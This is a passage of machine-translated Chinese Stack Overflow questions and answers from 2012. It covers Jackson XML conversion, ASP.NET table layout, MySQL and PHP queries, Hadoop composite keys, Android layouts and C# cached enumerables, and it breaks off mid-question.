   assign(paste0("resp.correction", i), resp.correction, envir = .GlobalEnv)
} 
```

# zend-framework - 使用 Google Maps API 在 Zend_Form 上的地址

> ID：12427069
> 
> 赞同：0
> 
> 时间：2012-09-14T15:00:04.233
> 
> 标签：zend-framework, google-maps

所以我是 Zend 和 Google Maps API 的新手，我想创建一个表单。如果用户在字段中输入地址（可能是完全在“表单”之外的字段），则在谷歌地图上查找地址，最好是实时的，但也可以使用“搜索地址”按钮完成。当用户对显示的地址感到满意时，他提交表单和地址（或长/纬度，最好的）从谷歌地图 api 中提取并与其他表单数据一起保存到数据库中。这将如何以最好的方式完成？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-18T08:08:42.203

最简单的方法是在表单中添加两个隐藏字段（纬度/经度）并在 javascript 中处理文本字段。因此，当用户输入完地址后，您将启动一个 ajax 请求并将生成的 lat / long 值写入隐藏字段中。提交后，您应该检查表格并在纬度/经度字段中查找填充值。如果它们丢失，则向用户显示错误消息。

# java - 使用杰克逊将具有重复元素的 XML 转换为 JSON

> ID：12427076
> 
> 赞同：6
> 
> 时间：2012-09-14T15:00:35.483
> 
> 标签：java, xml, jackson, xml-deserialization

我有一些 XML 格式的简单数据，我需要将其转换为 JSON，并且还能够将 JSON 转换回相同的 XML 字符串。但是我在使用现有的杰克逊（2.0.6 版）库时遇到了问题。

这是具有类似结构的 XML 数据示例

```
<channels>
  <channel>A</channel>
  <channel>B</channel>
  <channel>C</channel>
</channels> 
```

为了能够将其转换回原始 XML，我希望 JSON 看起来像这样

```
{
  "channels": {
    "channel": [
      "A",
      "B",
      "C"
    ]
  }
} 
```

然而杰克逊给了我

```
{"channel":"C"} 
```

不保留根元素名称，而是创建通道数组，最后一个覆盖以前的。

查看 com.fasterxml.jackson.databind.deser.std.BaseNodeDeserializer 的源代码，我发现该库不支持这一点，但允许覆盖和更改行为。

```
/**
 * Method called when there is a duplicate value for a field.
 * By default we don't care, and the last value is used.
 * Can be overridden to provide alternate handling, such as throwing
 * an exception, or choosing different strategy for combining values
 * or choosing which one to keep.
 *
 * @param fieldName Name of the field for which duplicate value was found
 * @param objectNode Object node that contains values
 * @param oldValue Value that existed for the object node before newValue
 *   was added
 * @param newValue Newly added value just added to the object node
 */
protected void _handleDuplicateField(String fieldName, ObjectNode objectNode,
                                     JsonNode oldValue, JsonNode newValue)
    throws JsonProcessingException
{
    // By default, we don't do anything
    ;
} 
```

**所以我的问题是**

> 1.  有没有人编写自定义反序列化器来支持此功能？或者有另一种方法可以解决这个问题。
> 2.  如何保留根元素名称？

下面是一个测试示例

```
import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.dataformat.xml.XmlMapper;
public class Test {
  public static void main(String[] args) throws Exception {
    String xml="<channels><channel>A</channel><channel>B</channel><channel>C</channel></channels>";

    XmlMapper xmlMapper = new XmlMapper();
    JsonNode node=xmlMapper.readValue(xml,JsonNode.class);
    System.out.println(node.toString());
  }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T21:39:08.037

这里真正重要的是您的类——仅显示 XML 本身并不能提供足够的信息来了解正在发生的事情。

我怀疑您将需要 Jackson 2.1（一旦它在一两周内发布），因为它最终正确地支持“未包装列表”。在此之前，只有“包装”列表才能正常工作。

# asp.net - 表格单元格定位问题

> ID：12427077
> 
> 赞同：0
> 
> 时间：2012-09-14T15:00:37.213
> 
> 标签：asp.net

我正在从文件后面的代码创建一个表格并放置一个占位符。

//在Main.aspx上

```
MyControl control1 = (MyControl)Page.LoadControl("MyControl.ascx");
control1.ID = "ctl1";
MyControl control2 = (MyControl)Page.LoadControl("MyControl.ascx");
control2.ID = "ctl2";
MyControl control3 = (MyControl)Page.LoadControl("MyControl.ascx");
control3.ID = "ctl3";
MyControl control4 = (MyControl)Page.LoadControl("MyControl.ascx");
control4.ID = "ctl4";

Table table = new Table();

TableCell cell1 = new TableCell();
TableCell cell2 = new TableCell();
TableCell cell3 = new TableCell();
TableCell cell4 = new TableCell();
TableRow row1 = new TableRow();
table.Style.Add(HtmlTextWriterStyle.Position, "absolute");

cell1.Controls.Add(control1);
row1.Cells.Add(cell1);
cell1.Style.Add(HtmlTextWriterStyle.Position, "absolute");
cell2.Controls.Add(control2);
row1.Cells.Add(cell2);
cell2.Style.Add(HtmlTextWriterStyle.Position, "absolute");
cell3.Controls.Add(control3);
row1.Cells.Add(cell3);
cell3.Style.Add(HtmlTextWriterStyle.Position, "absolute");
cell4.Controls.Add(control4);
row1.Cells.Add(cell4);
cell4.Style.Add(HtmlTextWriterStyle.Position, "absolute");

table.Rows.Add(row1);
placeHolder1.Controls.Add(table); 
```

//在 MyControl.ascx 上（我在这里放置控件；它是用 javascript 创建的）

```
<table cellpadding="0" cellspacing="0" border="0" width="217px" 
    style="position:relative" >
<tr>
    <td >
    <div id="c1" class="gauge" style="margin:0;padding:0;height:169px;width:217px;">   
    </div>
    </td>
</tr> 
```

// 在用户控件的 CSS 中

```
div.gauge
{
    background-repeat: no-repeat;
    background-position: top center;
    height: 169px;
    margin: 0px;
    overflow: visible;
    position: absolute;
    width: 217px;
    z-index: 0;
} 
```

但我看到只有第一个控件被加载，其他的没有。有什么遗漏吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:07:26.893

四个控件都在那里，问题是绝对定位

所有四个都具有相同的 x 和 y 定位，无论是否在表格内；

暂时删除绝对值以查看它们在页面中呈现

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-14T15:11:06.090

那是可怕的重复代码，在我继续阅读之前，让我们清理一下。

```
// Initializing parents at the top.
Table table = new Table();
table.Style.Add(HtmlTextWriterStyle.Position, "absolute");

TableRow row = new TableRow();

// For loop, you could turn this in a foreach to load controls based on an array.
for (int i = 1; i <= 4; ++i)
{
    MyControl control = (MyControl) Page.LoadControl("MyControl.ascx");
    control.ID = "ctl" + i.toString();

    TableCell cell = new TableCell();
    cell.Controls.Add(control);
    cell.Style.Add(HtmlTextWriterStyle.Position, "absolute");
    row.Cells.Add(cell)
}

table.Rows.Add(row);
placeHolder.Controls.Add(table); 
```

阅读起来更清晰，更容易发现错误。然而，当您谈论没有看到四个按钮时，它不是发现错误的正确位置，因此您必须更仔细地检查 HTML。使用适当的 Web 开发工具，您可以将元素悬停在 DOM 树中，您会看到它们位于彼此之上。

并且使用上面改进的代码，很容易抵消它们，只需使用`i`它...... :)

* * *

```
div.gauge
{
    background-repeat: no-repeat;
    background-position: top center;
    height: 169px;
    margin: 0px;
    overflow: visible;
    position: absolute;
    width: 217px;
    z-index: 0;
} 
```

你真的需要所有这些属性吗？

您指定`position: absolute`但实际上并未定位元素？`overflow: visible`有意义吗？怎么回事`z-index: 0`，为什么要指定？

# php - 使用mysql和php选择以相同4位数结尾的行分组的行

> ID：12427081
> 
> 赞同：0
> 
> 时间：2012-09-14T15:00:53.377
> 
> 标签：php, mysql, arrays

不知道这叫什么，这限制了我搜索答案的能力。

我有一个包含表单提交的表，每一行都是这个表单的一个字段。每组字段（每个提交）都用时间戳和索引号标记，例如`3247623445.8446`. 每行还有一列说明字段的名称，然后是另一列带有该字段的值。

我需要选择所有这些数据进行导出，将所有以相同的最后 4 位数字结尾的行分组，因此我最好可以创建一个关联数组，如下所示`$rows['8446'][fieldname] = $value`：

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-14T15:02:33.560

```
SELECT ...
...
GROUP BY RIGHT(yourfield, 4) 
```

可以做到这一点，假设这些数字存储为字符串而不是浮点数/双精度数。

当然，在第二次阅读您的问题时，我可能弄错了。对于您在 PHP 中的分组，它会是

```
while($row = mysql_fetch_assoc($result)) {
   $digits = substr($row['yourfield'], -4, 4); // get rightmost 4 chars
   $rows[$digits]...
} 
```

# prolog - Prolog 在解释器上显示结果

> ID：12427082
> 
> 赞同：0
> 
> 时间：2012-09-14T15:01:02.033
> 
> 标签：prolog, prolog-toplevel

我有这个序言谓词，它根据输入计数计算素数。

然而，在解释器上，即使我输入所需的素数为 10，它也只显示前 9 个素数。

结果如下所示

```
 L = [2, 3, 5, 7, 11, 13, 17, 19, 23|...] 
```

但是，当我使用图形调试器进行跟踪时，实际上会产生正确的结果。

所以我想知道 | ... 方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-14T15:08:52.490

解释器会截断“太长”的答案。

在顶部添加：

```
set_prolog_flag(toplevel_print_options, [quoted(true)]) 
```

请参阅此示例：http: [//garysieling.com/blog/printing-all-prolog-answers-to-a-file](http://garysieling.com/blog/printing-all-prolog-answers-to-a-file)

# hadoop - Hadoop - 复合键

> ID：12427090
> 
> 赞同：11
> 
> 时间：2012-09-14T15:01:32.690
> 
> 标签：hadoop, composite-key

假设我有一个包含用户活动数据的制表符分隔文件，格式如下：

```
timestamp  user_id  page_id  action_id 
```

我想编写一个 hadoop 作业来计算每个页面上的用户操作，因此输出文件应如下所示：

```
user_id  page_id  number_of_actions 
```

我在这里需要像复合键这样的东西——它将包含 user_id 和 page_id。有没有什么通用的方法可以用 hadoop 做到这一点？我找不到任何有用的东西。到目前为止，我在映射器中发出这样的密钥：

```
context.write(new Text(user_id + "\t" + page_id), one); 
```

它有效，但我觉得这不是最好的解决方案。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-14T16:17:17.020

只需编写自己的`Writable`. 在您的示例中，解决方案可能如下所示：

```
public class UserPageWritable implements WritableComparable<UserPageWritable> {

  private String userId;
  private String pageId;

  @Override
  public void readFields(DataInput in) throws IOException {
    userId = in.readUTF();
    pageId = in.readUTF();
  }

  @Override
  public void write(DataOutput out) throws IOException {
    out.writeUTF(userId);
    out.writeUTF(pageId);
  }

  @Override
  public int compareTo(UserPageWritable o) {
    return ComparisonChain.start().compare(userId, o.userId)
        .compare(pageId, o.pageId).result();
  }

} 
```

虽然我认为您的 ID 可能是 a `long`，但这里有`String`版本。基本上只是`Writable`接口上的正常序列化，请注意它需要默认构造函数，因此您应该始终提供一个。

逻辑清楚地告诉了如何对`compareTo`数据集进行排序，还告诉 reducer 哪些元素是相等的，以便可以对它们进行分组。

`ComparisionChain`是[Guava](http://code.google.com/p/guava-libraries/)的一个很好的工具。

**不要忘记覆盖equals和hashcode！**partitioner 将通过 key 的 hashcode 来确定 reducer。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-14T16:12:01.543

您可以编写自己的类来实现 Writable 和 WritableComparable 来比较您的两个字段。

皮埃尔-吕克·伯特兰

# php - Facebook 类型的新闻提要 Mysql 查询无法正常工作

> ID：12427091
> 
> 赞同：0
> 
> 时间：2012-09-14T15:01:33.923
> 
> 标签：php, mysql

我正在尝试创建像 facebook 这样的墙帖脚本

在新闻源区域，它应该显示来自当前用户和朋友的帖子。

我正在使用三个表：

1.  用户：userid、username、fname、lname、sex、email。

2.  帖子：post_id、用户名、posted_by、标题、类型。

3.  朋友：Id，user1，user2。

当任何用户添加另一个用户时，两者都将添加到朋友表中。

我正在使用 mysql 视图创建一个临时表来存储当前用户的所有朋友，并使用以下语句：

```
$friends = "CREATE VIEW ".mysql_real_escape_string($_SESSION['username'])." AS 
    SELECT users.username "."FROM users, friends "."
    WHERE ((users.username = friends.user1 OR users.username = friends.user2) AND 
    (users.username != '".mysql_real_escape_string($_SESSION['username'])."')) AND 
    (friends.user1 = '".mysql_real_escape_string($_SESSION['username'])."' OR 
    friends.user2 = '".mysql_real_escape_string($_SESSION['username'])."')";

mysql_query($friends) or die(mysql_error()); 
```

我正在使用以下语句在页面上显示帖子：

```
$query = "SELECT posts.*, user.fname, user.lname, user.username "."FROM 
    posts, users, ".mysql_real_escape_string($_SESSION['username'])." "."
    WHERE 
    (users.username = ".mysql_real_escape_string($_SESSION['username']) ".username 
    AND users.username = posts.username) OR 
    (users.username = '".mysql_real_escape_string($_SESSION['username'])."' AND 
    users.username = posts.username) 
    ORDER BY posts.post_id DESC LIMIT 0, 11"; 
```

问题是，它显示朋友的帖子没有任何问题；但是来自当前用户的帖子会重复，每个朋友一次。

换句话说，如果我有 5 个朋友，那么我的每个帖子都会显示 5 次。

请让我知道这个查询有什么问题，如果有更好的方法可以发帖给我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-14T15:26:19.707

您需要使用 MySQL [GROUP BY](http://dev.mysql.com/doc/refman/5.0/en/group-by-functions.html)聚合：

```
$query = "SELECT posts.*, user.fname, user.lname, user.username "."
    FROM posts, users, ".mysql_real_escape_string($_SESSION['username'])." "."
    WHERE (users.username = ".mysql_real_escape_string($_SESSION['username']) ".username  
    AND users.username = posts.username)
    OR (users.username = '".mysql_real_escape_string($_SESSION['username'])."' AND 
    users.username = posts.username) 
    GROUP BY posts.post_id
    ORDER BY posts.post_id DESC
    LIMIT 0, 11";` 
```

这将根据 post_id 将帖子分组为 1 行。

# android - 如何在复杂的布局树中将视图设置为离屏？

> ID：12427095
> 
> 赞同：1
> 
> 时间：2012-09-14T15:01:47.897
> 
> 标签：android, view, set, off-screen

我为平板电脑应用程序提供了以下布局结构：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:clipChildren="false" >

<LinearLayout
    android:id="@+id/placeholderForLeftFragment"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:baselineAligned="false" >

    <RelativeLayout
        android:id="@+id/placeholderFragmentHomeScreen"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="32" >
    </RelativeLayout>

    <RelativeLayout
        android:id="@+id/dummy"
        android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="69"
        android:background="#0000" >
    </RelativeLayout>
</LinearLayout>

<LinearLayout
    android:id="@+id/mainLinearLayout"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:baselineAligned="false"
    android:clipChildren="false" >

    <RelativeLayout
        android:id="@+id/invisbleRelativeLayout"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="32"
        android:background="#0000" >
    </RelativeLayout>

    <RelativeLayout
        android:id="@+id/placeholderFragmentHotelResultList"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="42"
        android:background="#F0FFFF" >
    </RelativeLayout>

    <RelativeLayout
        android:id="@+id/placeholderFragmentHotelDetailScreen"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="26" >
    </RelativeLayout>
</LinearLayout> 
```

第一个 LinearLayout 仅在左侧包含一个片段并且不可移动。第二个 LinearLayout 的第一个位置有一个不可见的元素，当我向左滑动另外两个 R.Layouts 时我会减少它，当我向后滑动时会增加。中间的 RelativeLayout 一直保持他的宽度，我可以在第一个 LinearLayout 上滑动第二个和第三个。实际上，第二个和第三个 R.Layout 应该具有相同的宽度，但第三个应该仅在屏幕边框处可见到 26%。

我现在想要做的是，第三个 R.Layout 的宽度与第二个从一开始（在应用程序启动后）的宽度相同，并且他的位置是屏幕外的一半。我试图做的是，创建一个布局，其宽度来自所有三个 R.Layouts 的总和并将布局放入其中，但它不起作用 - 我只看到第一个 LinearLayout 中的元素。当我在上面的代码中使用 weight 属性时，第三个 R.Lay 被拉伸，这正是我试图避免的行为。当我将Margin_right 设置为负值时，什么也没有发生。

我感谢任何想法和想法。谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-17T14:00:34.983

我发现以下解决方案对我来说很好。

```
<LinearLayout
    android:id="@+id/mainLinearLayout"
    android:layout_width="wrap_content"
    android:layout_height="match_parent"
    android:baselineAligned="false"
    android:clipChildren="false"
    android:weightSum="100" >

    <RelativeLayout
        android:id="@+id/invisbleRelativeLayout"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="32"
        android:background="#0000" >
    </RelativeLayout>

    <RelativeLayout
        android:id="@+id/placeholder1"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="43"
        android:background="#F0FFFF" >
    </RelativeLayout>

    <RelativeLayout
        android:id="@+id/placeholder2"
        android:layout_width="0dp"
        android:layout_height="match_parent"
        android:layout_weight="43"
        android:background="#F0FFFF" >
    </RelativeLayout>
</LinearLayout> 
```

请注意，三个布局的权重之和大于顶部 LinearLayout 中的 100。

# c# - 是否有一个 IEnumerable 实现只迭代它的源（例如 LINQ）一次？

> ID：12427097
> 
> 赞同：23
> 
> 时间：2012-09-14T15:01:49.987
> 
> 标签：c#, .net, linq, ienumerable

提供`items`的是 LINQ 表达式的结果：

```
var items = from item in ItemsSource.RetrieveItems()
            where ... 
```

假设每个项目的生成需要一些不可忽略的时间。

有两种可能的操作模式：

1.  使用`foreach`将允许在集合开始时开始处理项目，比最终可用的项目要早得多。但是，如果我们想稍后再次处理同一个集合，我们将不得不复制保存它：

    ```
    var storedItems = new List<Item>();
    foreach(var item in items)
    {
        Process(item);
        storedItems.Add(item);
    }

    // Later
    foreach(var item in storedItems)
    {
        ProcessMore(item);
    } 
    ```

    因为如果我们刚刚做了`foreach(... in items)`then`ItemsSource.RetrieveItems()`会再次被调用。

2.  我们可以`.ToList()`直接使用，但这将迫使我们等待最后一个项目被检索，然后我们才能开始处理第一个项目。

**问题**：是否有一种`IEnumerable`实现会像常规 LINQ 查询结果一样第一次迭代，但会在进程中实现，以便第二次`foreach`迭代存储的值？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-09-14T16:11:25.587

一个有趣的挑战，所以我必须提供自己的解决方案。事实上非常有趣，我的解决方案现在是版本 3。版本 2 是我根据 Servy 的反馈进行的简化。然后我意识到我的解决方案有很大的缺点。如果缓存的可枚举的第一个枚举没有完成，则不会进行缓存。许多 LINQ 扩展都喜欢`First`并且`Take`只会枚举足够的可枚举来完成工作，我必须更新到版本 3 才能使这项工作与缓存一起使用。

问题是关于不涉及并发访问的可枚举的后续枚举。尽管如此，我还是决定让我的解决方案线程安全。它增加了一些复杂性和一些开销，但应该允许在所有场景中使用该解决方案。

```
public static class EnumerableExtensions {

  public static IEnumerable<T> Cached<T>(this IEnumerable<T> source) {
    if (source == null)
      throw new ArgumentNullException("source");
    return new CachedEnumerable<T>(source);
  }

}

class CachedEnumerable<T> : IEnumerable<T> {

  readonly Object gate = new Object();

  readonly IEnumerable<T> source;

  readonly List<T> cache = new List<T>();

  IEnumerator<T> enumerator;

  bool isCacheComplete;

  public CachedEnumerable(IEnumerable<T> source) {
    this.source = source;
  }

  public IEnumerator<T> GetEnumerator() {
    lock (this.gate) {
      if (this.isCacheComplete)
        return this.cache.GetEnumerator();
      if (this.enumerator == null)
        this.enumerator = source.GetEnumerator();
    }
    return GetCacheBuildingEnumerator();
  }

  public IEnumerator<T> GetCacheBuildingEnumerator() {
    var index = 0;
    T item;
    while (TryGetItem(index, out item)) {
      yield return item;
      index += 1;
    }
  }

  bool TryGetItem(Int32 index, out T item) {
    lock (this.gate) {
      if (!IsItemInCache(index)) {
        // The iteration may have completed while waiting for the lock.
        if (this.isCacheComplete) {
          item = default(T);
          return false;
        }
        if (!this.enumerator.MoveNext()) {
          item = default(T);
          this.isCacheComplete = true;
          this.enumerator.Dispose();
          return false;
        }
        this.cache.Add(this.enumerator.Current);
      }
      item = this.cache[index];
      return true;
    }
  }

  bool IsItemInCache(Int32 index) {
    return index < this.cache.Count;
  }

  IEnumerator IEnumerable.GetEnumerator() {
    return GetEnumerator();
  }

} 
```

扩展名是这样使用的（`sequence`是一个`IEnumerable<T>`）：

```
var cachedSequence = sequence.Cached();

// Pulling 2 items from the sequence.
foreach (var item in cachedSequence.Take(2))
  // ...

// Pulling 2 items from the cache and the rest from the source.
foreach (var item in cachedSequence)
  // ...

// Pulling all items from the cache.
foreach (var item in cachedSequence)
  // ... 
```

如果仅枚举部分可枚举对象（例如`cachedSequence.Take(2).ToList()`. 使用的枚举器`ToList`将被释放，但底层源枚举器未释放。这是因为前 2 项被缓存并且源枚举器保持活动状态应该对后续项目的请求。在这种情况下，源枚举器仅在符合垃圾收集条件时才被清理（这将与可能的大缓存相同）。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-09-14T15:20:12.723

看看[Reactive Extentsions](http://msdn.microsoft.com/en-us/data/gg577609)库 - 有一个`MemoizeAll()`扩展，它会在您的 IEnumerable 中缓存项目，一旦它们被访问，并存储它们以供将来访问。

请参阅Bart De Smet 的[这篇](http://community.bartdesmet.net/blogs/bart/archive/2010/01/07/more-linq-with-system-interactive-functional-fun-and-taming-side-effects.aspx)`MemoizeAll`博文，了解有关其他 Rx 方法的详细信息。

**编辑**：这实际上可以在单独的交互式扩展包中找到 - 可从[NuGet](http://nuget.org/packages/Ix_Experimental-Main)或[Microsoft 下载](http://www.microsoft.com/en-us/download/details.aspx?id=27203)。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-14T15:10:10.730

```
public static IEnumerable<T> SingleEnumeration<T>(this IEnumerable<T> source)
{
    return new SingleEnumerator<T>(source);
}

private class SingleEnumerator<T> : IEnumerable<T>
{
    private CacheEntry<T> cacheEntry;
    public SingleEnumerator(IEnumerable<T> sequence)
    {
        cacheEntry = new CacheEntry<T>(sequence.GetEnumerator());
    }

    public IEnumerator<T> GetEnumerator()
    {
        if (cacheEntry.FullyPopulated)
        {
            return cacheEntry.CachedValues.GetEnumerator();
        }
        else
        {
            return iterateSequence<T>(cacheEntry).GetEnumerator();
        }
    }

    IEnumerator IEnumerable.GetEnumerator()
    {
        return this.GetEnumerator();
    }
}

private static IEnumerable<T> iterateSequence<T>(CacheEntry<T> entry)
{
    using (var iterator = entry.CachedValues.GetEnumerator())
    {
        int i = 0;
        while (entry.ensureItemAt(i) && iterator.MoveNext())
        {
            yield return iterator.Current;
            i++;
        }
    }
}

private class CacheEntry<T>
{
    public bool FullyPopulated { get; private set; }
    public ConcurrentQueue<T> CachedValues { get; private set; }

    private static object key = new object();
    private IEnumerator<T> sequence;

    public CacheEntry(IEnumerator<T> sequence)
    {
        this.sequence = sequence;
        CachedValues = new ConcurrentQueue<T>();
    }

    /// <summary>
    /// Ensure that the cache has an item a the provided index.  If not, take an item from the 
    /// input sequence and move to the cache.
    /// 
    /// The method is thread safe.
    /// </summary>
    /// <returns>True if the cache already had enough items or 
    /// an item was moved to the cache, 
    /// false if there were no more items in the sequence.</returns>
    public bool ensureItemAt(int index)
    {
        //if the cache already has the items we don't need to lock to know we 
        //can get it
        if (index < CachedValues.Count)
            return true;
        //if we're done there's no race conditions hwere either
        if (FullyPopulated)
            return false;

        lock (key)
        {
            //re-check the early-exit conditions in case they changed while we were
            //waiting on the lock.

            //we already have the cached item
            if (index < CachedValues.Count)
                return true;
            //we don't have the cached item and there are no uncached items
            if (FullyPopulated)
                return false;

            //we actually need to get the next item from the sequence.
            if (sequence.MoveNext())
            {
                CachedValues.Enqueue(sequence.Current);
                return true;
            }
            else
            {
                FullyPopulated = true;
                return false;
            }
        }
    }
} 
```

所以这已经被编辑（基本上）以支持多线程访问。多个线程可以请求项目，并且在逐个项目的基础上，它们将被缓存。它不需要等待整个序列被迭代以返回缓存值。下面是一个示例程序，演示了这一点：

```
private static IEnumerable<int> interestingIntGenertionMethod(int maxValue)
{
    for (int i = 0; i < maxValue; i++)
    {
        Thread.Sleep(1000);
        Console.WriteLine("actually generating value: {0}", i);
        yield return i;
    }
}

public static void Main(string[] args)
{
    IEnumerable<int> sequence = interestingIntGenertionMethod(10)
        .SingleEnumeration();

    int numThreads = 3;
    for (int i = 0; i < numThreads; i++)
    {
        int taskID = i;
        Task.Factory.StartNew(() =>
        {
            foreach (int value in sequence)
            {
                Console.WriteLine("Task: {0} Value:{1}",
                    taskID, value);
            }
        });
    }

    Console.WriteLine("Press any key to exit...");
    Console.ReadKey(true);
} 
```

你真的需要看到它运行才能了解这里的力量。一旦单个线程强制生成下一个实际值，所有剩余的线程都可以立即打印该生成的值，但如果该线程没有未缓存的值要打印，它们都将等待。（显然，线程/线程池调度可能会导致一项任务花费比需要更长的时间来打印它的值。）

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-08-16T00:49:39.940

Martin Liversage 和 Servy已经分别发布了[`Cached`](https://stackoverflow.com/a/12428250/11178549)/运算符的线程安全实现，并且[System.Interactive](https://www.nuget.org/packages/System.Interactive/)包中的线程安全运算符也可用。如果不需要线程安全，并且不希望支付线程同步的成本，那么在[这个问题](https://stackoverflow.com/questions/1537043/caching-ienumerable "Caching IEnumerable")中有提供非同步实现的答案。所有这些实现的共同点是它们都基于自定义类型。我的挑战是在一个独立的扩展方法（不附加任何条件）中编写一个类似的非同步运算符。这是我的实现：[`SingleEnumeration`](https://stackoverflow.com/a/12427251/11178549)[`Memoise`](https://github.com/dotnet/reactive/blob/main/Ix.NET/Source/System.Interactive/System/Linq/Operators/Memoize.cs)`ToCachedEnumerable`

```
public static IEnumerable<T> MemoiseNotSynchronized<T>(this IEnumerable<T> source)
{
    // Argument validation omitted
    IEnumerator<T> enumerator = null;
    List<T> buffer = null;
    return Implementation();

    IEnumerable<T> Implementation()
    {
        if (buffer != null && enumerator == null)
        {
            // The source has been fully enumerated
            foreach (var item in buffer) yield return item;
            yield break;
        }

        enumerator ??= source.GetEnumerator();
        buffer ??= new();
        for (int i = 0; ; i = checked(i + 1))
        {
            if (i < buffer.Count)
            {
                yield return buffer[i];
            }
            else if (enumerator.MoveNext())
            {
                Debug.Assert(buffer.Count == i);
                var current = enumerator.Current;
                buffer.Add(current);
                yield return current;
            }
            else
            {
                enumerator.Dispose(); enumerator = null;
                yield break;
            }
        }
    }
} 
```

使用示例：

```
IEnumerable<Point> points = GetPointsFromDB().MemoiseNotSynchronized();
// Enumerate the 'points' any number of times, on a single thread.
// The data will be fetched from the DB only once.
// The connection with the DB will open when the 'points' is enumerated
// for the first time, partially or fully.
// The connection will stay open until the 'points' is enumerated fully
// for the first time. 
```

[在 Fiddle 上](https://dotnetfiddle.net/NZw42k)测试`MemoiseNotSynchronized`运算符。

# android - 带有editText的SeekBar StringIndexOutOfBoundsException

> ID：12427099
> 
> 赞同：0
> 
> 时间：2012-09-14T15:01:55.820
> 
> 标签：android, android-edittext

推进我的项目，我正在与一个我无法解决的问题作斗争..

想在 ListView 上运行搜索功能，所以我使用了 EditText。

我的问题：当我在 EditText 中获得两个字符并且仅显示包含我传递给它的“名称”的项目时，我的方法运行良好，但是当我获得第三个字符时，应用程序崩溃..

这是我的日志：

```
09-14 16:49:05.647: E/AndroidRuntime(20020): FATAL EXCEPTION: main
09-14 16:49:05.647: E/AndroidRuntime(20020): java.lang.StringIndexOutOfBoundsException: length=2; regionStart=0; regionLength=3
09-14 16:49:05.647: E/AndroidRuntime(20020):    at java.lang.String.startEndAndLength(String.java:593)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at java.lang.String.substring(String.java:1474)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at java.lang.String.subSequence(String.java:1861)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at com.android.bordeaux.code.MyListActivity$3.onTextChanged(MyListActivity.java:126)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.widget.TextView.sendOnTextChanged(TextView.java:8315)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.widget.TextView.handleTextChanged(TextView.java:8362)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.widget.TextView$ChangeWatcher.onTextChanged(TextView.java:8725)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.text.SpannableStringBuilder.sendTextChange(SpannableStringBuilder.java:892)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.text.SpannableStringBuilder.change(SpannableStringBuilder.java:352)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.text.SpannableStringBuilder.change(SpannableStringBuilder.java:266)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.text.SpannableStringBuilder.replace(SpannableStringBuilder.java:443)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.text.SpannableStringBuilder.replace(SpannableStringBuilder.java:420)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.text.SpannableStringBuilder.replace(SpannableStringBuilder.java:29)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.view.inputmethod.BaseInputConnection.replaceText(BaseInputConnection.java:667)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.view.inputmethod.BaseInputConnection.commitText(BaseInputConnection.java:188)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at com.android.internal.widget.EditableInputConnection.commitText(EditableInputConnection.java:149)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at com.android.internal.view.IInputConnectionWrapper.executeMessage(IInputConnectionWrapper.java:279)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at com.android.internal.view.IInputConnectionWrapper$MyHandler.handleMessage(IInputConnectionWrapper.java:77)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.os.Handler.dispatchMessage(Handler.java:99)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.os.Looper.loop(Looper.java:137)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at android.app.ActivityThread.main(ActivityThread.java:4517)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at java.lang.reflect.Method.invokeNative(Native Method)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at java.lang.reflect.Method.invoke(Method.java:511)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:993)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:760)
09-14 16:49:05.647: E/AndroidRuntime(20020):    at dalvik.system.NativeStart.main(Native Method) 
```

这是我的代码：

```
inputSearch = (EditText) findViewById(R.id.inputSearch);

inputSearch.addTextChangedListener(new TextWatcher() {
                  public void onTextChanged(CharSequence s, int start, int before, int count)
